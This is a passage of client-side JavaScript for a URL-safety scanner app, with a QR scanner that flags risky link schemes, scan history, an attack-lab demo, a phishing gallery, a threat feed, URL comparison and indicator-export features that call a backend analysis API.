    modal.innerHTML = `<div class="report-modal-content glass-card"><div class="card-header"><h3><i data-lucide="file-text"></i> Security Report</h3><button class="btn-icon" onclick="document.getElementById('report-modal').classList.add('hidden')"><i data-lucide="x"></i></button></div><pre id="report-text" class="report-pre font-mono"></pre><p class="report-hint">Select all (Ctrl+A) and copy manually.</p></div>`;
    document.body.appendChild(modal); if (typeof lucide !== 'undefined') lucide.createIcons();
  }
  document.getElementById('report-text').textContent = report;
  modal.classList.remove('hidden');
}

// ============================================================================
// QR Code Scanner
// ============================================================================
const WEB_SCHEMES = ['http:', 'https:'];
const DANGEROUS_SCHEMES = ['javascript:', 'data:', 'vbscript:', 'blob:'];

function detectQRPayloadType(text) {
  try { const url = new URL(text); if (DANGEROUS_SCHEMES.includes(url.protocol)) return 'dangerous'; if (WEB_SCHEMES.includes(url.protocol)) return 'web'; return 'app-link'; }
  catch { if (/^https?:\/\//i.test(text)) return 'web'; if (/^[A-Za-z][A-Za-z0-9+\-.]*:/.test(text)) return 'app-link'; return 'text'; }
}

function handleQRResult(text) {
  closeQRScanner();
  const type = detectQRPayloadType(text);
  urlInput.value = text;
  if (type === 'dangerous') { showQRWarning('⚠ DANGEROUS PAYLOAD', `Detected scheme: ${text.split(':')[0]}:`, 'This payload can execute code in your browser. Do NOT click or paste it.', 'dangerous'); return; }
  if (type === 'text') { showQRWarning('📄 NON-URL PAYLOAD', 'Plain text detected', 'This QR code contains plain text, not a URL.', 'info'); return; }
  if (type === 'app-link') { showQRWarning('⚠ NON-WEB PAYLOAD', `Detected scheme: ${text.split(':')[0]}:`, 'This QR code uses a non-web scheme.', 'warn'); return; }
  setTimeout(() => {
    hideError(); hideResults(); showLoading('Analyzing URL structure...');
    handleAnalyze(text).catch(err => showError('Analysis Failed', err.message)).finally(() => hideLoading());
  }, 300);
}

function showQRWarning(title, subtitle, message, level) {
  const existing = document.getElementById('qr-payload-warning'); if (existing) existing.remove();
  const el = document.createElement('div'); el.id = 'qr-payload-warning'; el.className = `qr-payload-warning qr-warning--${level}`;
  el.innerHTML = `<div class="qr-warning-header"><span class="qr-warning-title">${escapeHTML(title)}</span><button class="btn-icon" onclick="document.getElementById('qr-payload-warning').remove()"><i data-lucide="x"></i></button></div><div class="qr-warning-subtitle font-mono">${escapeHTML(subtitle)}</div><div class="qr-warning-message">${escapeHTML(message)}</div>${level !== 'info' ? `<button class="btn btn-primary" style="margin-top:0.75rem;width:100%" onclick="document.getElementById('qr-payload-warning').remove(); document.getElementById('analyze-form').dispatchEvent(new Event('submit'))">Analyze Anyway</button>` : ''}`;
  const inputCard = document.querySelector('.input-card'); if (inputCard) inputCard.insertAdjacentElement('afterend', el); else form.insertAdjacentElement('afterend', el);
  if (typeof lucide !== 'undefined') lucide.createIcons();
}

function toggleQRScanner() { qrReaderContainer.classList.contains('hidden') ? openQRScanner() : closeQRScanner(); }
function openQRScanner() {
  qrReaderContainer.classList.remove('hidden');
  if (!qrScanner && typeof Html5Qrcode !== 'undefined') {
    qrScanner = new Html5Qrcode('qr-reader');
    qrScanner.start({ facingMode: 'environment' }, { fps: 10, qrbox: { width: 250, height: 250 } }, text => handleQRResult(text), () => {}).catch(() => { showError('QR Scanner Error', 'Could not access camera.'); closeQRScanner(); });
  }
}
function closeQRScanner() { qrReaderContainer.classList.add('hidden'); if (qrScanner) { qrScanner.stop().then(() => { qrScanner.clear(); qrScanner = null; }).catch(() => {}); } }

// ============================================================================
// History
// ============================================================================
function loadHistoryFromStorage() { try { scanHistory = JSON.parse(localStorage.getItem('cybersafe_history') || '[]'); } catch { scanHistory = []; } }
function saveHistoryToStorage() { try { localStorage.setItem('cybersafe_history', JSON.stringify(scanHistory)); } catch {} }
function addToHistory(item) { scanHistory.unshift(item); if (scanHistory.length > 50) scanHistory = scanHistory.slice(0, 50); saveHistoryToStorage(); renderHistory(); renderFullHistory(); }

function formatTimestamp(ts) {
  if (!ts) return '';
  try { const d = new Date(ts); const now = new Date(); const diffMin = Math.floor((now - d) / 60000); if (diffMin < 1) return 'just now'; if (diffMin < 60) return `${diffMin}m ago`; const diffHr = Math.floor(diffMin / 60); if (diffHr < 24) return `${diffHr}h ago`; return d.toLocaleDateString(); } catch { return ''; }
}

function renderHistory(filter) {
  const items = filter ? scanHistory.filter(i => i.url && i.url.toLowerCase().includes(filter.toLowerCase())) : scanHistory;
  if (!items.length) { emptyHistory.classList.remove('hidden'); historyList.querySelectorAll('.history-item').forEach(el => el.remove()); return; }
  emptyHistory.classList.add('hidden');
  historyList.querySelectorAll('.history-item').forEach(el => el.remove());
  const fragment = document.createDocumentFragment();
  items.forEach((item, i) => {
    const el = document.createElement('div'); el.className = 'history-item'; el.setAttribute('title', item.url || '');
    el.innerHTML = `<div class="history-item-top"><span class="history-verdict ${escapeHTML(item.verdict)}">${escapeHTML(item.verdict)}</span><span class="history-meta font-mono">${item.score != null ? `<span class="history-score">${item.score}</span>` : ''}${item.findingCount != null ? `<span class="history-findings">${item.findingCount} ${item.findingCount === 1 ? 'finding' : 'findings'}</span>` : ''}</span></div><div class="history-item-bottom"><span class="history-url">${escapeHTML(item.url || '')}</span><span class="history-time">${escapeHTML(formatTimestamp(item.timestamp))}</span></div>`;
    el.addEventListener('click', () => { urlInput.value = scanHistory[i]?.url || ''; urlInput.focus(); switchToTab('scan'); });
    fragment.appendChild(el);
  });
  historyList.appendChild(fragment);
}

function clearHistory() { scanHistory = []; saveHistoryToStorage(); renderHistory(); renderFullHistory(); }

// ============================================================================
// UI State Helpers
// ============================================================================
function showLoading(msg) { if (loadingText) loadingText.textContent = msg || 'Analyzing URL structure...'; loadingState.classList.remove('hidden'); analyzeBtn.disabled = true; }
function hideLoading() { loadingState.classList.add('hidden'); analyzeBtn.disabled = false; }
function showError(title, msg) { errorTitle.textContent = title; errorMessage.textContent = msg; errorState.classList.remove('hidden'); }
function hideError() { errorState.classList.add('hidden'); }
function hideResults() { resultsContainer.classList.add('hidden'); }

function showResults() { resultsContainer.classList.remove('hidden'); offlineResults.classList.remove('hidden'); }

// ============================================================================
// ATTACK LAB
// ============================================================================
function initAttackLab() {
  renderAttackLabGrid(ATTACK_LABS);

  // Search
  const search = document.getElementById('attack-lab-search');
  if (search) {
    search.addEventListener('input', () => filterAttackLabs());
  }

  // Filter buttons
  document.querySelectorAll('.filter-btn').forEach(btn => {
    btn.addEventListener('click', () => {
      document.querySelectorAll('.filter-btn').forEach(b => b.classList.remove('active'));
      btn.classList.add('active');
      filterAttackLabs();
    });
  });

  // Close result panel
  const closeBtn = document.getElementById('close-lab-result');
  if (closeBtn) closeBtn.addEventListener('click', () => { document.getElementById('attack-lab-result').classList.add('hidden'); });

  // Run Again
  const runAgain = document.getElementById('lab-run-again');
  if (runAgain) runAgain.addEventListener('click', () => {
    const url = document.getElementById('lab-example-url').textContent;
    if (url) runAttackLab(url);
  });

  // View Full Analysis
  const viewFull = document.getElementById('lab-view-full');
  if (viewFull) viewFull.addEventListener('click', () => {
    const url = document.getElementById('lab-example-url').textContent;
    if (url) { urlInput.value = url; switchToTab('scan'); hideError(); hideResults(); showLoading('Analyzing URL structure...'); handleAnalyze(url).catch(err => showError('Analysis Failed', err.message)).finally(() => hideLoading()); }
  });
}

function filterAttackLabs() {
  const search = (document.getElementById('attack-lab-search')?.value || '').toLowerCase();
  const category = document.querySelector('.filter-btn.active')?.getAttribute('data-filter') || 'ALL';

  const filtered = ATTACK_LABS.filter(lab => {
    const matchSearch = !search || lab.name.toLowerCase().includes(search) || lab.desc.toLowerCase().includes(search) || lab.category.toLowerCase().includes(search);
    const matchCategory = category === 'ALL' || lab.category === category;
    return matchSearch && matchCategory;
  });

  renderAttackLabGrid(filtered);
}

function renderAttackLabGrid(labs) {
  const grid = document.getElementById('attack-lab-grid');
  if (!grid) return;

  // Group by category
  const categories = {};
  labs.forEach(lab => {
    if (!categories[lab.category]) categories[lab.category] = [];
    categories[lab.category].push(lab);
  });

  const categoryNames = { DECEPTION: 'URL Deception', PAYLOAD: 'Dangerous Payloads', NETWORK: 'Host & Network', PHISHING: 'Phishing Patterns', STRUCTURE: 'URL Structure' };

  grid.innerHTML = Object.entries(categories).map(([cat, catLabs]) => `
    <div class="lab-category">
      <h4 class="lab-category-title">${escapeHTML(categoryNames[cat] || cat)}</h4>
      <div class="lab-category-grid">
        ${catLabs.map(lab => `
          <button class="attack-lab-btn" onclick="runAttackLab('${escapeHTML(lab.url).replace(/'/g, "\\'")}')" data-lab-id="${lab.id}">
            <div class="attack-lab-icon">${lab.icon}</div>
            <div class="attack-lab-info">
              <strong>${escapeHTML(lab.name)}</strong>
              <span>${escapeHTML(lab.desc)}</span>
            </div>
          </button>
        `).join('')}
      </div>
    </div>
  `).join('');

  if (!labs.length) {
    grid.innerHTML = '<div class="empty-state"><p>No techniques match your search.</p></div>';
  }
}

async function runAttackLab(url) {
  const resultPanel = document.getElementById('attack-lab-result');
  const lab = ATTACK_LABS.find(l => l.url === url);

  document.getElementById('lab-result-title').textContent = lab ? `Attack Lab — ${lab.name}` : 'Attack Lab Result';
  document.getElementById('lab-example-url').textContent = url;
  document.getElementById('lab-verdict').textContent = 'Analyzing...';
  document.getElementById('lab-score').textContent = '—';
  document.getElementById('lab-explanation').textContent = lab ? lab.concept : 'Analyzing...';

  resultPanel.classList.remove('hidden');
  resultPanel.scrollIntoView({ behavior: 'smooth', block: 'nearest' });

  try {
    const response = await fetch(API.analyze, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ url }),
    });
    const data = await response.json();
    if (data.success && data.analysis) {
      const a = data.analysis;
      const verdictEl = document.getElementById('lab-verdict');
      verdictEl.textContent = a.verdict;
      verdictEl.className = `verdict-value verdict-${a.verdict.toLowerCase()}`;
      document.getElementById('lab-score').textContent = `${a.score} / 100`;

      // Build explanation with findings
      let explanation = lab ? lab.concept + '\n\n' : '';
      if (a.findings && a.findings.length) {
        explanation += 'Detected Rules:\n';
        a.findings.forEach(f => { explanation += `• ${f.title} [${f.severity.toUpperCase()}] (+${f.score})\n`; });
      }
      explanation += `\nRecommendation: ${a.recommendation || ''}`;
      document.getElementById('lab-explanation').textContent = explanation;
    }
  } catch (err) {
    document.getElementById('lab-verdict').textContent = 'ERROR';
    document.getElementById('lab-explanation').textContent = 'Could not reach the analysis server. ' + getReadableError(err);
  }

  if (typeof lucide !== 'undefined') lucide.createIcons();
}
window.runAttackLab = runAttackLab;

// ============================================================================
// PHISHING GALLERY
// ============================================================================
function initPhishingGallery() {
  const grid = document.getElementById('phishing-gallery-grid');
  if (!grid) return;

  grid.innerHTML = PHISHING_GALLERY.map((item, i) => `
    <div class="gallery-card">
      <div class="gallery-card-header">
        <h4>${escapeHTML(item.technique)}</h4>
      </div>
      <div class="gallery-card-body">
        <div class="gallery-field">
          <span class="gallery-label">Example</span>
          <code class="gallery-code font-mono">${escapeHTML(item.example)}</code>
        </div>
        <div class="gallery-field">
          <span class="gallery-label">What the user sees</span>
          <span class="gallery-text">${escapeHTML(item.userSees)}</span>
        </div>
        <div class="gallery-field">
          <span class="gallery-label">What the URL actually contains</span>
          <span class="gallery-text gallery-text--warn">${escapeHTML(item.actualContent)}</span>
        </div>
        <div class="gallery-field">
          <span class="gallery-label">Why it matters</span>
          <span class="gallery-text">${escapeHTML(item.whyMatters)}</span>
        </div>
        <div class="gallery-field">
          <span class="gallery-label">CyberSafe Detection</span>
          <span class="gallery-text gallery-text--detection">${escapeHTML(item.detection)}</span>
        </div>
        <div class="gallery-field">
          <span class="gallery-label">How to stay safe</span>
          <span class="gallery-text gallery-text--safe">${escapeHTML(item.howToStay)}</span>
        </div>
      </div>
      <button class="btn btn-primary gallery-analyze-btn" onclick="analyzeGalleryItem('${escapeHTML(item.example).replace(/'/g, "\\'")}')">
        <i data-lucide="search"></i> Analyze This Example
      </button>
    </div>
  `).join('');

  if (typeof lucide !== 'undefined') lucide.createIcons();
}

function analyzeGalleryItem(url) {
  urlInput.value = url;
  switchToTab('scan');
  hideError();
  hideResults();
  showLoading('Analyzing URL structure...');
  handleAnalyze(url).catch(err => showError('Analysis Failed', err.message)).finally(() => hideLoading());
}
window.analyzeGalleryItem = analyzeGalleryItem;

// ============================================================================
// THREAT FEED
// ============================================================================
function initThreatFeed() {
  const list = document.getElementById('threat-feed-list');
  if (!list) return;

  list.innerHTML = DEMO_THREATS.map(threat => {
    const severityClass = { CRITICAL: 'suspicious', HIGH: 'suspicious', MEDIUM: 'review', LOW: 'safe' }[threat.severity] || 'review';
    return `
    <div class="threat-card">
      <div class="threat-header">
        <span class="threat-type">${escapeHTML(threat.type)}</span>
        <span class="severity-badge ${severityClass}">${escapeHTML(threat.severity)}</span>
      </div>
      <div class="threat-indicator font-mono">${escapeHTML(threat.indicator)}</div>
      <div class="threat-meta">
        <span class="threat-category">${escapeHTML(threat.category)}</span>
        <span class="threat-source">Source: ${escapeHTML(threat.source)}</span>
        <span class="threat-time">${new Date(threat.timestamp).toLocaleString()}</span>
      </div>
      <button class="btn btn-secondary threat-analyze-btn" onclick="analyzeGalleryItem('${escapeHTML(threat.indicator).replace(/'/g, "\\'")}')">
        <i data-lucide="search"></i> Analyze Indicator
      </button>
    </div>`;
  }).join('');

  if (typeof lucide !== 'undefined') lucide.createIcons();
}

// ============================================================================
// URL COMPARISON
// ============================================================================
function initURLComparison() {
  const btn = document.getElementById('compare-urls-btn');
  if (btn) btn.addEventListener('click', compareURLs);
}

async function compareURLs() {
  const urlA = document.getElementById('compare-url-a')?.value.trim();
  const urlB = document.getElementById('compare-url-b')?.value.trim();

  if (!urlA || !urlB) { showError('Comparison Error', 'Please enter both URLs to compare.'); return; }

  const resultsDiv = document.getElementById('compare-results');
  resultsDiv.classList.remove('hidden');

  const panelA = document.getElementById('compare-result-a');
  const panelB = document.getElementById('compare-result-b');
  panelA.innerHTML = '<div class="comparing-loader">Analyzing...</div>';
  panelB.innerHTML = '<div class="comparing-loader">Analyzing...</div>';

  try {
    const [respA, respB] = await Promise.allSettled([
      fetch(API.analyze, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ url: urlA }) }).then(r => r.json()),
      fetch(API.analyze, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ url: urlB }) }).then(r => r.json()),
    ]);

    panelA.innerHTML = renderCompareResult(respA.status === 'fulfilled' ? respA.value : null, urlA);
    panelB.innerHTML = renderCompareResult(respB.status === 'fulfilled' ? respB.value : null, urlB);
  } catch (err) {
    panelA.innerHTML = '<p class="compare-error">Analysis failed</p>';
    panelB.innerHTML = '<p class="compare-error">Analysis failed</p>';
  }

  if (typeof lucide !== 'undefined') lucide.createIcons();
}

function renderCompareResult(data, url) {
  if (!data || !data.success) return `<div class="compare-error">Analysis failed for this URL</div>`;
  const a = data.analysis;
  const p = a.parsed || {};
  const verdictClass = a.verdict.toLowerCase();
  return `
    <div class="compare-url font-mono">${escapeHTML(url)}</div>
    <div class="compare-verdict compare-verdict--${verdictClass}">${escapeHTML(a.verdict)}</div>
    <div class="compare-metrics">
      <div class="compare-metric"><span class="compare-metric-label">Risk</span><span class="compare-metric-value">${a.score}/100</span></div>
      <div class="compare-metric"><span class="compare-metric-label">Confidence</span><span class="compare-metric-value">${(a.confidence || '').toUpperCase()}</span></div>
    </div>
    <div class="compare-details">
      <div class="compare-detail"><span>Scheme</span><span class="font-mono">${escapeHTML(p.scheme || '—')}</span></div>
      <div class="compare-detail"><span>Hostname</span><span class="font-mono">${escapeHTML(a.actual_hostname || p.hostname || '—')}</span></div>
      <div class="compare-detail"><span>Path</span><span class="font-mono">${escapeHTML(p.path || '/')}</span></div>
      <div class="compare-detail"><span>Userinfo (@)</span><span>${p.has_userinfo ? '⚠ Yes' : 'No'}</span></div>
      <div class="compare-detail"><span>Findings</span><span>${(a.findings || []).length} detected</span></div>
    </div>
    ${(a.findings || []).length ? `<div class="compare-findings">${(a.findings || []).map(f => `<div class="compare-finding"><span>${escapeHTML(f.title)}</span><span class="severity-badge ${escapeHTML(f.severity)}">${escapeHTML(f.severity)}</span></div>`).join('')}</div>` : '<div class="compare-clean">No structural risks detected</div>'}
  `;
}

// ============================================================================
// IOC EXTRACTION
// ============================================================================
function initIOC() {
  const copyBtn = document.getElementById('copy-ioc-btn');
  if (copyBtn) copyBtn.addEventListener('click', copyIOC);
}

function renderIOC(analysis) {
  const panel = document.getElementById('ioc-panel');
  const grid = document.getElementById('ioc-grid');
  if (!panel || !grid) return;

  const p = analysis.parsed || {};
  const indicators = [
    { label: 'Hostname', value: analysis.actual_hostname || p.hostname || '—' },
    { label: 'Scheme', value: p.scheme || '—' },
    { label: 'Port', value: p.port ? String(p.port) : 'Default' },
    { label: 'Path', value: p.path || '/' },
    { label: 'Query', value: p.query || 'None' },
    { label: 'Userinfo', value: p.has_userinfo ? 'Yes (Deceptive)' : 'No' },
    { label: 'Punycode', value: p.is_punycode ? `Yes — ${p.unicode_hostname || 'IDN'}` : 'No' },
    { label: 'Shortener', value: (analysis.findings || []).some(f => f.rule_id?.includes('SHORTENER')) ? 'Detected' : 'No' },
    { label: 'Lookalike', value: (analysis.findings || []).some(f => f.rule_id?.includes('LOOKALIKE') || f.rule_id?.includes('BRAND')) ? 'Detected' : 'No' },
  ];

  grid.innerHTML = indicators.map(ind => `
    <div class="ioc-item">
      <span class="ioc-label">${escapeHTML(ind.label)}</span>
      <span class="ioc-value font-mono">${escapeHTML(ind.value)}</span>
    </div>
  `).join('');

  panel.classList.remove('hidden');
}

function copyIOC() {
  const a = window._lastAnalysis;
  if (!a) return;
  const p = a.parsed || {};
  const lines = [
    `Hostname: ${a.actual_hostname || p.hostname || '—'}`,
    `Scheme: ${p.scheme || '—'}`,
    `Port: ${p.port || 'Default'}`,
    `Path: ${p.path || '/'}`,
    `Query: ${p.query || 'None'}`,
    `Userinfo: ${p.has_userinfo ? 'Yes (Deceptive)' : 'No'}`,
    `Punycode: ${p.is_punycode ? 'Yes' : 'No'}`,
  ];
  navigator.clipboard.writeText(lines.join('\n')).then(() => {
    const btn = document.getElementById('copy-ioc-btn');
    if (btn) { btn.textContent = '✓ Copied!'; setTimeout(() => { btn.innerHTML = '<i data-lucide="copy"></i> Copy Indicators'; if (typeof lucide !== 'undefined') lucide.createIcons(); }, 2000); }
  }).catch(() => {});
}

// ============================================================================
// BADGE
// ============================================================================
function initBadge() {
  const btn = document.getElementById('generate-badge-btn');
  if (btn) btn.addEventListener('click', generateBadge);
  const copyBtn = document.getElementById('copy-badge-btn');
  if (copyBtn) copyBtn.addEventListener('click', copyBadge);
}

async function generateBadge() {
  const url = document.getElementById('badge-url-input')?.value.trim();
  if (!url) return;

  const btn = document.getElementById('generate-badge-btn');
  btn.disabled = true;
  btn.textContent = 'Verifying...';

  try {
    const response = await fetch(API.badge, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ url }),
    });
    const data = await response.json();
    if (data.success) {
      document.getElementById('badge-verdict-text').textContent = data.verdict;
      document.getElementById('badge-verdict-text').className = `badge-verdict badge-verdict--${data.verdict.toLowerCase()}`;
      document.getElementById('badge-score-text').textContent = String(data.score);
      document.getElementById('badge-confidence-text').textContent = (data.confidence || '').toUpperCase();
      document.getElementById('badge-result').classList.remove('hidden');
    }
  } catch (err) {
    showError('Badge Error', getReadableError(err));
  } finally {
    btn.disabled = false;
    btn.innerHTML = '<i data-lucide="shield-check"></i> Generate Badge';
    if (typeof lucide !== 'undefined') lucide.createIcons();
  }
}

function copyBadge() {
  const verdict = document.getElementById('badge-verdict-text')?.textContent || '';
  const score = document.getElementById('badge-score-text')?.textContent || '';
  const confidence = document.getElementById('badge-confidence-text')?.textContent || '';
  const badge = `CYBERSAFE VERIFIED | ${verdict} | Risk: ${score} | Confidence: ${confidence}`;
  navigator.clipboard.writeText(badge).then(() => {
    const btn = document.getElementById('copy-badge-btn');
    if (btn) { btn.textContent = '✓ Copied!'; setTimeout(() => { btn.innerHTML = '<i data-lucide="copy"></i> Copy Badge Code'; if (typeof lucide !== 'undefined') lucide.createIcons(); }, 2000); }
  }).catch(() => {});
}

// ============================================================================
// FULL HISTORY TAB
// ============================================================================
function initFullHistory() {
  renderFullHistory();

  const filterInput = document.getElementById('history-filter');
  if (filterInput) filterInput.addEventListener('input', renderFullHistory);

  const verdictFilter = document.getElementById('history-verdict-filter');
  if (verdictFilter) verdictFilter.addEventListener('change', renderFullHistory);

  const clearBtn = document.getElementById('clear-all-history');
  if (clearBtn) clearBtn.addEventListener('click', () => { clearHistory(); renderFullHistory(); });
}

function renderFullHistory() {
  const list = document.getElementById('full-history-list');
  const emptyState = document.getElementById('history-empty-state');
  if (!list) return;

  const searchTerm = (document.getElementById('history-filter')?.value || '').toLowerCase();
  const verdictFilter = document.getElementById('history-verdict-filter')?.value || '';

  let items = scanHistory;
  if (searchTerm) items = items.filter(i => i.url?.toLowerCase().includes(searchTerm));
  if (verdictFilter) items = items.filter(i => i.verdict === verdictFilter);

  // Remove existing items but keep empty state
  list.querySelectorAll('.history-full-item').forEach(el => el.remove());

  if (!items.length) {
    if (emptyState) emptyState.classList.remove('hidden');
    return;
  }
  if (emptyState) emptyState.classList.add('hidden');

  items.forEach((item, i) => {
    const el = document.createElement('div');
    el.className = 'history-full-item';
    el.innerHTML = `
      <div class="history-full-top">
        <span class="history-verdict ${escapeHTML(item.verdict)}">${escapeHTML(item.verdict)}</span>
        <span class="history-full-score font-mono">Score: ${item.score ?? '—'}</span>
        <span class="history-full-findings">${item.findingCount ?? 0} findings</span>
        <span class="history-full-time">${escapeHTML(formatTimestamp(item.timestamp))}</span>
      </div>
      <div class="history-full-url font-mono">${escapeHTML(item.url || '')}</div>
    `;
    el.addEventListener('click', () => { urlInput.value = item.url || ''; switchToTab('scan'); });
    list.appendChild(el);
  });
}

// ============================================================================
// Utilities
// ============================================================================
function escapeHTML(str) {
  if (str == null) return '';
  return String(str).replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
}
